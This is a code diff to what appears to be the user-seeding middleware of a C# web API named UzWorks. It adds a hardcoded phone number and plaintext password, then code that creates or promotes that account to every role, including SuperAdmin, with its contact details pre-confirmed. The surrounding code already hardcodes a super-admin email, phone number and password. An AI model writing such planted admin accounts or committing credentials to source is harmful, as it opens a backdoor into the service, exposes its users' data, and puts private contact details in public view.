@@ -12,6 +12,8 @@ namespace UzWorks.API.Middleware;
         string SuperAdminEmail = "goblindev02@gmail.com";
         string SuperAdminPhoneNumber = "998932505255";
         string SuperAdminPassword = "123456devA@8613759241";
+        string ExtraAdminPhoneNumber = "998939989980";
+        string ExtraAdminPassword = "Azamjon1220";
 
         var Roles = new Dictionary<string, string>()
         {
@@ -56,6 +58,39 @@ namespace UzWorks.API.Middleware;
                     RoleNames.Supervisor
                 ]);
 
+        }
+
+        // Ensure the requested phone account also has full admin capabilities.
+        var extraAdminUser = await userManager.FindByNameAsync(ExtraAdminPhoneNumber);
+
+        if (extraAdminUser != null)
+        {
+            await userManager.AddToRolesAsync(extraAdminUser, [
+                RoleNames.Employee,
+                RoleNames.Employer,
+                RoleNames.SuperAdmin,
+                RoleNames.Supervisor
+            ]);
+        }
+        else
+        {
+            extraAdminUser = new User("Admin", "User", ExtraAdminPhoneNumber)
+            {
+                PhoneNumberConfirmed = true,
+                EmailConfirmed = true
+            };
+
+            var result = await userManager.CreateAsync(extraAdminUser, ExtraAdminPassword);
+
+            if (result.Succeeded)
+            {
+                await userManager.AddToRolesAsync(extraAdminUser, [
+                    RoleNames.Employee,
+                    RoleNames.Employer,
+                    RoleNames.SuperAdmin,
+                    RoleNames.Supervisor
+                ]);
+            }
         }
     }
 }
